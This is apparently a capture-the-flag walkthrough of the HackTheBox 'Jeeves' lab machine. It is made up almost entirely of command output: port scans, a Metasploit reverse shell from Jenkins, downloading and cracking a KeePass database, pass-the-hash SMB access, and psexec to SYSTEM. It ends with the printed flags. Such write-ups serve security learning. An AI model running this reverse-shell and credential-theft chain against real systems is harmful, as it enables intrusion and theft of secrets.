---
title: "HackTheBox Jeeves"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

![5jenkins](https://imgur.com/lZBhQ23.jpg)

root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:02 CEST  
Nmap scan report for 10.10.10.63  
Host is up (0.078s latency).  
Not shown: 65531 filtered ports  
PORT STATE SERVICE  
80/tcp open http  
135/tcp open msrpc  
445/tcp open microsoft-ds  
50000/tcp open ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds  
root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:10 CEST  
Nmap scan report for 10.10.10.63  
Host is up (0.11s latency).

PORT STATE SERVICE VERSION  
80/tcp filtered http  
135/tcp open msrpc Microsoft Windows RPC  
445/tcp filtered microsoft-ds  
50000/tcp open http Jetty 9.4.z-SNAPSHOT  
|_http-server-header: Jetty(9.4.z-SNAPSHOT)  
|_http-title: Error 404 Not Found  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2008 (89%), FreeBSD 6.X (85%)  
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2  
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), FreeBSD 6.2-RELEASE (85%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)  
HOP RTT ADDRESS  
1 65.52 ms 10.10.14.1  
2 273.84 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds

root@kali:~/htb/jeeves# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -u http://10.10.10.63:50000

Gobuster v1.4.1 OJ Reeves (@TheColonial)  
=====================================================  
=====================================================  
[+] Mode : dir  
[+] Url/Domain : http://10.10.10.63:50000/  
[+] Threads : 50  
[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt  
[+] Status codes : 200,204,301,302,307  
=====================================================  
/askjeeves (Status: 302)

![1jenkins](https://imgur.com/SEgHp6t.jpg)

![2jenkins](https://imgur.com/NRLrVP3.jpg)

![3jenkins](https://imgur.com/JFZAihz.jpg)

msf > use exploit/multi/handler  
msf exploit(multi/handler) > set lhost 10.10.14.206  
lhost => 10.10.14.206  
msf exploit(multi/handler) > set lport 44544  
lport => 44544  
msf exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp  
payload => windows/x64/shell/reverse_tcp  
msf exploit(multi/handler) > clear  
[*] exec: clear

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.206:44544  
[*] Sending stage (336 bytes) to 10.10.10.63  
[*] Command shell session 5 opened (10.10.14.206:44544 -> 10.10.10.63:49694) at 2018-05-17 20:21:01 +0200

Microsoft Windows [Version 10.0.10586]  
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>More?  
More?

'PuGroj' is not recognized as an internal or external command,  
operable program or batch file.

C:\Users\Administrator\.jenkins>^Z  
Background session 5? [y/N] y  
msf exploit(multi/handler) > sessions -u 5  
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [5]

[*] Upgrading session ID: 5  
[*] Starting exploit/multi/handler  
[*] Started reverse TCP handler on 10.10.14.206:4433  
#<Thread:0x000056306eca6008@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):  
Traceback (most recent call last):  
1: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'  
/usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:268:in `block in cleanup_handler': uninitialized constant Msf::Modules::Mod706f73742f6d756c74692f6d616e6167652f7368656c6c5f746f5f  
6d65746572707265746572::MetasploitModule::HANDLE_TIMEOUT (NameError)  
msf exploit(multi/handler) >  
[*] Sending stage (179779 bytes) to 10.10.10.63  
[*] Meterpreter session 6 opened (10.10.14.206:4433 -> 10.10.10.63:49695) at 2018-05-17 20:21:31 +0200  
Interrupt: use the 'exit' command to quit  
msf exploit(multi/handler) > sessions -i 6  
[*] Starting interaction with 6...

meterpreter > getuid  
Server username: JEEVES\kohsuke

meterpreter > cd C:/Users/kohsuke  
meterpreter > ls  
Listing: C:\Users\kohsuke  
=========================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
40777/rwxrwxrwx 0 dir 2017-11-04 03:51:45 +0100 .groovy  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 AppData  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Application Data  
40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Contacts  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Cookies  
40555/r-xr-xr-x 0 dir 2017-11-04 04:19:59 +0100 Desktop  
40555/r-xr-xr-x 4096 dir 2017-11-04 04:18:57 +0100 Documents  
40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Downloads  
40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Favorites  
40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 Links  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Local Settings  
40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Music  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Documents  
100666/rw-rw-rw- 786432 fil 2017-12-24 20:38:40 +0100 NTUSER.DAT  
100666/rw-rw-rw- 65536 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TM.blf  
100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000001.regtrans-ms  
100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000002.regtrans-ms  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 NetHood  
40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 OneDrive  
40555/r-xr-xr-x 0 dir 2017-11-04 08:10:02 +0100 Pictures  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 PrintHood  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Recent  
40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Saved Games  
40555/r-xr-xr-x 4096 dir 2017-11-04 04:16:35 +0100 Searches  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 SendTo  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Start Menu  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Templates  
40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Videos  
100666/rw-rw-rw- 81920 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG1  
100666/rw-rw-rw- 163840 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG2  
100666/rw-rw-rw- 20 fil 2017-11-04 03:50:40 +0100 ntuser.ini

meterpreter > cd Desktop  
meterpreter > ls  
Listing: C:\Users\kohsuke\Desktop  
=================================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
100666/rw-rw-rw- 282 fil 2017-11-04 04:15:51 +0100 desktop.ini  
100444/r--r--r-- 32 fil 2017-11-04 04:22:51 +0100 user.txt

meterpreter > cd ..  
meterpreter > cd Documents

meterpreter > ls  
Listing: C:\Users\kohsuke\Documents  
===================================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
100666/rw-rw-rw- 2846 fil 2017-09-18 19:43:17 +0200 CEH.kdbx  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Music  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Pictures  
40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Videos  
100666/rw-rw-rw- 402 fil 2017-11-04 04:15:51 +0100 desktop.ini

meterpreter > download CEH.kdbx  
[*] Downloading: CEH.kdbx -> CEH.kdbx  
[*] Downloaded 2.78 KiB of 2.78 KiB (100.0%): CEH.kdbx -> CEH.kdbx  
[*] download : CEH.kdbx -> CEH.kdbx

root@kali:~/htb/jeeves# ls  
CEH.kdbx  
root@kali:~/htb/jeeves# keepass2john CEH.kdbx > hash  
root@kali:~/htb/jeeves# john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8  
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])  
Press 'q' or Ctrl-C to abort, almost any other key for status  
moonshine1 (CEH)  
1g 0:00:00:52 DONE (2018-05-17 20:25) 0.01922g/s 1057p/s 1057c/s 1057C/s moonshine1  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed  
root@kali:~/htb/jeeves# keepass2 CEH.kdbx

![4jenkins](https://imgur.com/sjSlTdI.jpg)

root@kali:~/htb/jeeves# smbclient.py administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00  
Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies

Type help for list of commands  
# help

open {host,port=445} - opens a SMB connection against the target host/port  
login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted  
kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name  
login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes  
logoff - logs off  
shares - list available shares  
use {sharename} - connect to an specific share  
cd {path} - changes the current directory to {path}  
lcd {path} - changes the current local directory to {path}  
pwd - shows current remote directory  
password - changes the user password, the new password will be prompted for input  
ls {wildcard} - lists all the files in the current directory  
rm {file} - removes the selected file  
mkdir {dirname} - creates the directory under the current path  
rmdir {dirname} - removes the directory under the current path  
put {filename} - uploads the filename into the current path  
get {filename} - downloads the filename from the current path  
info - returns NetrServerInfo main results  
who - returns the sessions currently connected at the target host (admin required)  
close - closes the current SMB Session  
exit - terminates the server process (and this session)

# who  
host: \\10.10.14.229, user: ADMINISTRATOR, active: 30, idle: 26  
host: \\10.10.14.229, user: ADMINISTRATOR, active: 28, idle: 28  
host: \\10.10.14.206, user: administrator, active: 21, idle: 0  
# password  
New Password:

msf > use exploit/windows/smb/psexec  
msf exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

Name Current Setting Required Description  
---- --------------- -------- -----------  
RHOST yes The target address  
RPORT 445 yes The SMB service port (TCP)  
SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing  
SERVICE_DISPLAY_NAME no The service display name  
SERVICE_NAME no The service name  
SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share  
SMBDomain . no The Windows domain to use for authentication  
SMBPass no The password for the specified username  
SMBUser no The username to authenticate as

Exploit target:

Id Name  
-- ----  
0 Automatic

msf exploit(windows/smb/psexec) > set RHOST 10.10.10.63  
RHOST => 10.10.10.63  
msf exploit(windows/smb/psexec) > set smbpass 123456  
smbpass => 123456  
msf exploit(windows/smb/psexec) > set smbuser administrator  
smbuser => administrator  
msf exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.206:4444  
[*] 10.10.10.63:445 - Connecting to the server...  
[*] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user 'administrator'...  
[*] 10.10.10.63:445 - Selecting PowerShell target  
[*] 10.10.10.63:445 - Executing the payload...  
[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable...  
[*] Sending stage (179779 bytes) to 10.10.10.63  
[*] Meterpreter session 1 opened (10.10.14.206:4444 -> 10.10.10.63:49672) at 2018-05-17 21:14:07 +0200

meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM  
meterpreter > cd C:/Users/Administrator/Desktop  
meterpreter > ls  
[-] Unknown command: ls.  
meterpreter > ls  
Listing: C:\Users\Administrator\Desktop  
=======================================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
100666/rw-rw-rw- 797 fil 2017-11-08 15:05:18 +0100 Windows 10 Update Assistant.lnk  
100666/rw-rw-rw- 282 fil 2017-11-04 03:03:17 +0100 desktop.ini  
100444/r--r--r-- 36 fil 2017-12-24 08:51:10 +0100 hm.txt

meterpreter > cat hm.txt  
The flag is elsewhere. Look deeper.

C:\Users\Administrator\Desktop>more < hm.txt:root.txt  
more < hm.txt:root.txt  
afbc5bd4b615a60648cec41c6ac92530